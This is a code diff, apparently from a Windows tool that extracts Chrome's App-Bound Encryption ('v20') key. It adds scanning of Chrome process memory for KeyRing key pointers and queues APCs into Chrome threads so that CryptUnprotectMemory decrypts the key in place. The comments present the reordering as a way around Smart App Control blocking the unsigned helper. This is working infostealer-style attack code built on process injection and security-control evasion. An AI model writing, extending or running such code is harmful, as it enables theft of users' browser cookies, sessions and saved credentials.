@@ -3034,7 +3034,7 @@ def _oserror_label(exc: BaseException) -> str:
                 5: "AccessDenied",
                 32: "SharingViolation",
             }
-            return names.get(int(win), str(int(win)))
+            return names.get(int(win), str(int(win)))  # 4551 = Smart App Control
         if exc.errno:
             return f"errno{int(exc.errno)}"
     return type(exc).__name__
@@ -3099,6 +3099,12 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         v20_sample = _resolve_v20_sample(v20_sample) or b""
         if not _valid_v20_sample(v20_sample):
             return None, _join_abe_hr(trail)
+    # In-process memscan first. Unsigned helper is blocked by Smart App Control (4551).
+    key, hr = _memscan_abe_key(v20_sample)
+    if key:
+        return key, "0x00000000"
+    if hr:
+        trail.append(hr)
     helper, compile_hr = _compiled_abe_helper_exe()
     if helper is None:
         trail.append(compile_hr or "csc_missing")
@@ -3114,13 +3120,10 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
                 return key, "0x00000000"
             if hr:
                 trail.append(hr)
+            if hr and "4551" in hr:
+                break
         if not ran:
             trail.append("helper:never_ran")
-    key, hr = _memscan_abe_key(v20_sample)
-    if key:
-        return key, "0x00000000"
-    if hr:
-        trail.append(hr)
     return None, _join_abe_hr(trail) or "helper:never_ran"
 
 
@@ -3338,26 +3341,41 @@ def _high_entropy32(buf: bytes) -> bool:
 _KEYRING_V20_MARK = b"\x03\x00\x00\x00\x00\x01"
 
 
+def _vector32_at(buf: bytes, base: int) -> int | None:
+    """key_.begin if [base+32] is a 32-byte libc++ vector."""
+    if base < 0 or base + 40 > len(buf):
+        return None
+    begin = int.from_bytes(buf[base + 32 : base + 40], "little")
+    if not _looks_like_user_ptr(begin):
+        return None
+    if base + 48 <= len(buf):
+        finish = int.from_bytes(buf[base + 40 : base + 48], "little")
+        if finish == begin + 32:
+            return _canonical_ptr(begin)
+    if base + 29 <= len(buf) and buf[base + 23 : base + 29] == _KEYRING_V20_MARK:
+        return _canonical_ptr(begin)
+    return None
+
+
 def _keyring_v20_key_ptrs(buf: bytes) -> list[int]:
-    """key_.begin from a Chrome 151 KeyRing `v20` node. Not cookie `v20`+nonce."""
+    """key_.begin from a Chrome 151 KeyRing `v20` node (data-first or size-first SSO)."""
     out: list[int] = []
     start = 0
     while True:
         idx = buf.find(b"v20\x00", start)
-        if idx < 0 or idx + 40 > len(buf):
+        if idx < 0:
             break
         start = idx + 1
-        marked = idx + 29 <= len(buf) and buf[idx + 23 : idx + 29] == _KEYRING_V20_MARK
-        begin = int.from_bytes(buf[idx + 32 : idx + 40], "little")
-        if not _looks_like_user_ptr(begin):
-            continue
-        if marked:
-            out.append(_canonical_ptr(begin))
-            continue
-        if idx + 48 <= len(buf):
-            finish = int.from_bytes(buf[idx + 40 : idx + 48], "little")
-            if finish == begin + 32:
-                out.append(_canonical_ptr(begin))
+        bases = [idx]
+        if idx >= 1:
+            bases.append(idx - 1)
+        aligned = idx & ~7
+        if aligned not in bases:
+            bases.append(aligned)
+        for base in bases:
+            ptr = _vector32_at(buf, base)
+            if ptr is not None:
+                out.append(ptr)
     return out
 
 
@@ -3494,18 +3512,62 @@ def _remote_export_addr(k32: Any, handle: Any, dll: str, name: str) -> int:
     return local_fn
 
 
+def _threads_for_pid(pid: int) -> list[int]:
+    if os.name != "nt":
+        return []
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return []
+
+    class THREADENTRY32(ctypes.Structure):
+        _fields_ = [
+            ("dwSize", wintypes.DWORD),
+            ("cntUsage", wintypes.DWORD),
+            ("th32ThreadID", wintypes.DWORD),
+            ("th32OwnerProcessID", wintypes.DWORD),
+            ("tpBasePri", ctypes.c_long),
+            ("tpDeltaPri", ctypes.c_long),
+            ("dwFlags", wintypes.DWORD),
+        ]
+
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    k32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
+    snap = k32.CreateToolhelp32Snapshot(0x4, 0)
+    if not snap or int(snap) == -1:
+        return []
+    tids: list[int] = []
+    try:
+        te = THREADENTRY32()
+        te.dwSize = ctypes.sizeof(THREADENTRY32)
+        if not k32.Thread32First(snap, ctypes.byref(te)):
+            return []
+        while True:
+            if int(te.th32OwnerProcessID) == pid:
+                tids.append(int(te.th32ThreadID))
+            if not k32.Thread32Next(snap, ctypes.byref(te)):
+                break
+    finally:
+        k32.CloseHandle(snap)
+    return tids
+
+
 class _RemoteUnprotect:
-    """CryptUnprotectMemory SAME_PROCESS via APC to NtTestAlert. Not CoCreate."""
+    """CryptUnprotectMemory SAME_PROCESS via special APC. Not CoCreate."""
 
     def __init__(self, pid: int) -> None:
         self.pid = pid
         self.handle = None
         self.data = None
         self.unprotect_fn = 0
+        self.protect_fn = 0
         self.nt_test_alert = 0
+        self.threads: list[Any] = []
         self.kernel32: Any = None
         self.ntdll: Any = None
         self.ok = False
+        self.changed = 0
         if os.name != "nt":
             return
         try:
@@ -3517,6 +3579,8 @@ class _RemoteUnprotect:
         ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
         k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
         k32.OpenProcess.restype = wintypes.HANDLE
+        k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+        k32.OpenThread.restype = wintypes.HANDLE
         k32.CloseHandle.argtypes = [wintypes.HANDLE]
         k32.CloseHandle.restype = wintypes.BOOL
         k32.VirtualAllocEx.argtypes = [
@@ -3565,73 +3629,152 @@ class _RemoteUnprotect:
             ctypes.c_void_p,
         ]
         ntdll.NtQueueApcThread.restype = ctypes.c_long
+        if hasattr(ntdll, "NtQueueApcThreadEx2"):
+            ntdll.NtQueueApcThreadEx2.argtypes = [
+                wintypes.HANDLE,
+                wintypes.HANDLE,
+                wintypes.ULONG,
+                ctypes.c_void_p,
+                ctypes.c_void_p,
+                ctypes.c_void_p,
+                ctypes.c_void_p,
+            ]
+            ntdll.NtQueueApcThreadEx2.restype = ctypes.c_long
         access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000
         handle = k32.OpenProcess(access, False, pid)
         if not handle:
             return
         unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
+        protect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptProtectMemory")
         nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
         data = k32.VirtualAllocEx(handle, None, 32, 0x3000, 0x04)
-        if not unprotect_fn or not nt_test_alert or not data:
+        if not unprotect_fn or not data:
             k32.CloseHandle(handle)
             return
+        thread_access = 0x0010 | 0x0002 | 0x0040
+        opened: list[Any] = []
+        for tid in _threads_for_pid(pid)[:16]:
+            th = k32.OpenThread(thread_access, False, tid)
+            if th:
+                opened.append(th)
+            if len(opened) >= 4:
+                break
         self.kernel32 = k32
         self.ntdll = ntdll
         self.handle = handle
         self.data = int(data)
         self.unprotect_fn = int(unprotect_fn)
-        self.nt_test_alert = int(nt_test_alert)
+        self.protect_fn = int(protect_fn or 0)
+        self.nt_test_alert = int(nt_test_alert or 0)
+        self.threads = opened
         self.ok = True
+
+    def _read32(self, addr: int) -> bytes | None:
+        import ctypes
+
+        out = (ctypes.c_char * 32)()
+        got = ctypes.c_size_t(0)
+        if not self.kernel32.ReadProcessMemory(
+            self.handle, addr, out, 32, ctypes.byref(got)
+        ):
+            return None
+        if int(got.value) != 32:
+            return None
+        return bytes(out)
+
+    def _apc(self, pfn: int, addr: int) -> bool:
+        """Queue CryptUnprotect/ProtectMemory(addr, 32, SAME_PROCESS) in chrome."""
+        if not pfn or not addr:
+            return False
+        import ctypes
+        from ctypes import wintypes
+
+        ntdll = self.ntdll
+        k32 = self.kernel32
+        queued = False
+        if hasattr(ntdll, "NtQueueApcThreadEx2"):
+            for th in self.threads:
+                status = int(
+                    ntdll.NtQueueApcThreadEx2(
+                        th, None, 1, pfn, addr, 32, 1
+                    )
+                )
+                if status >= 0:
+                    queued = True
+                    break
+        if not queued:
+            for th in self.threads:
+                status = int(ntdll.NtQueueApcThread(th, pfn, addr, 32, 1))
+                if status >= 0:
+                    queued = True
+                    break
+        if not queued and self.nt_test_alert:
+            tid = wintypes.DWORD(0)
+            thread = k32.CreateRemoteThread(
+                self.handle, None, 0, self.nt_test_alert, None, 0x4, ctypes.byref(tid)
+            )
+            if thread:
+                try:
+                    status = int(ntdll.NtQueueApcThread(thread, pfn, addr, 32, 1))
+                    if status >= 0:
+                        k32.ResumeThread(thread)
+                        k32.WaitForSingleObject(thread, 200)
+                        queued = True
+                finally:
+                    k32.CloseHandle(thread)
+        if queued:
+            time.sleep(0.02)
+        return queued
 
     def unprotect(self, blob: bytes) -> bytes | None:
         if not self.ok or not blob or len(blob) != 32:
             return None
         import ctypes
-        from ctypes import wintypes
 
-        k32 = self.kernel32
         wrote = ctypes.c_size_t(0)
         src = ctypes.create_string_buffer(blob, 32)
-        if not k32.WriteProcessMemory(self.handle, self.data, src, 32, ctypes.byref(wrote)):
+        if not self.kernel32.WriteProcessMemory(
+            self.handle, self.data, src, 32, ctypes.byref(wrote)
+        ):
             return None
-        tid = wintypes.DWORD(0)
-        thread = k32.CreateRemoteThread(
-            self.handle, None, 0, self.nt_test_alert, None, 0x4, ctypes.byref(tid)
-        )
-        if not thread:
+        if not self._apc(self.unprotect_fn, self.data):
             return None
-        try:
-            status = int(
-                self.ntdll.NtQueueApcThread(
-                    thread,
-                    self.unprotect_fn,
-                    self.data,
-                    32,
-                    1,
-                )
-            )
-            if status < 0:
-                return None
-            k32.ResumeThread(thread)
-            if int(k32.WaitForSingleObject(thread, 200)) != 0:
-                return None
-        finally:
-            k32.CloseHandle(thread)
-        out = (ctypes.c_char * 32)()
-        got = ctypes.c_size_t(0)
-        if not k32.ReadProcessMemory(self.handle, self.data, out, 32, ctypes.byref(got)):
+        plain = self._read32(self.data)
+        if plain and plain != blob:
+            self.changed += 1
+            return plain
+        return None
+
+    def unprotect_at(self, addr: int) -> bytes | None:
+        """In-place CryptUnprotectMemory on chrome's key_ bytes, then re-protect."""
+        if not self.ok or not addr:
             return None
-        if int(got.value) != 32:
+        before = self._read32(addr)
+        if not before or not _high_entropy32(before):
             return None
-        plain = bytes(out)
-        return plain if plain != blob else None
+        if not self._apc(self.unprotect_fn, addr):
+            return None
+        plain = self._read32(addr)
+        if self.protect_fn:
+            self._apc(self.protect_fn, addr)
+        if plain and plain != before:
+            self.changed += 1
+            return plain
+        return None
 
     def close(self) -> None:
-        if self.handle and self.kernel32:
-            try:
-                self.kernel32.CloseHandle(self.handle)
-            except Exception:  # noqa: BLE001
-                pass
+        if self.kernel32:
+            for th in self.threads:
+                try:
+                    self.kernel32.CloseHandle(th)
+                except Exception:  # noqa: BLE001
+                    pass
+            self.threads = []
+            if self.handle:
+                try:
+                    self.kernel32.CloseHandle(self.handle)
+                except Exception:  # noqa: BLE001
+                    pass
         self.handle = None
         self.ok = False
 
@@ -3700,6 +3843,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     tried = 0
     opened = 0
     unprotect_ok = 0
+    apc_changed = 0
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
     PROCESS_QUERY_INFORMATION = 0x0400
@@ -3712,7 +3856,9 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     allowed_prot = {0x02, 0x04, 0x08, 0x40}
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
 
-    def consider(cand: bytes | None, unprotect: _RemoteUnprotect | None) -> bytes | None:
+    def consider(
+        cand: bytes | None, unprotect: _RemoteUnprotect | None, addr: int | None = None
+    ) -> bytes | None:
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
             return None
@@ -3724,6 +3870,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             plain = unprotect.unprotect(cand)
             if _v20_key_ok(plain, v20_sample):
                 return plain
+            if addr:
+                plain = unprotect.unprotect_at(addr)
+                if _v20_key_ok(plain, v20_sample):
+                    return plain
         return None
 
     for pid in pids:
@@ -3786,7 +3936,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             if not blob:
                                 continue
                             for cand in _keys_from_key_blob(blob):
-                                hit = consider(cand, unprotect)
+                                hit = consider(cand, unprotect, ptr)
                                 if hit:
                                     return hit, "ok"
                 nxt = addr + size
@@ -3794,13 +3944,18 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     break
                 addr = nxt
         finally:
+            apc_changed += int(unprotect.changed)
             unprotect.close()
             kernel32.CloseHandle(handle)
     if opened == 0:
         return None, "memscan:OpenProcess"
     if tried == 0:
         return None, "memscan:no_cand"
-    extra = "" if unprotect_ok else ";unprotect:0"
+    extra = ""
+    if not unprotect_ok:
+        extra = ";unprotect:0"
+    elif apc_changed == 0:
+        extra = ";apc:0"
     return None, f"memscan:no_key:{tried}{extra}"
 
 
@@ -4286,19 +4441,20 @@ class K {
           int read;
           if (ReadProcessMemory(h, mbi.BaseAddress, buf, n, out read) && read >= 16) {
             scanned += read;
-            for (int i = 0; i + 40 <= read && found.Count < MAX_CAND; i++) {
+            for (int i = 0; i + 4 <= read && found.Count < MAX_CAND; i++) {
               if (buf[i] != (byte)'v' || buf[i+1] != (byte)'2' || buf[i+2] != (byte)'0' || buf[i+3] != 0)
                 continue;
-              bool marked = i + 29 <= read && buf[i+23] == 3 && buf[i+24] == 0 && buf[i+25] == 0
-                && buf[i+26] == 0 && buf[i+27] == 0 && buf[i+28] == 1;
-              ulong begin = BitConverter.ToUInt64(buf, i + 32);
-              if (!UserPtr(begin)) continue;
-              if (marked) {
-                TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
-                continue;
+              int[] bases = (i > 0) ? new int[] { i, i - 1, i & ~7 } : new int[] { i, i & ~7 };
+              foreach (int b in bases) {
+                if (b < 0 || b + 40 > read) continue;
+                ulong begin = BitConverter.ToUInt64(buf, b + 32);
+                if (!UserPtr(begin)) continue;
+                bool marked = b + 29 <= read && buf[b+23] == 3 && buf[b+24] == 0 && buf[b+25] == 0
+                  && buf[b+26] == 0 && buf[b+27] == 0 && buf[b+28] == 1;
+                bool vec = b + 48 <= read && BitConverter.ToUInt64(buf, b + 40) == begin + 32UL;
+                if (marked || vec)
+                  TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
               }
-              if (i + 48 <= read && BitConverter.ToUInt64(buf, i + 40) == begin + 32UL)
-                TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
             }
             for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
               ulong start = BitConverter.ToUInt64(buf, i);
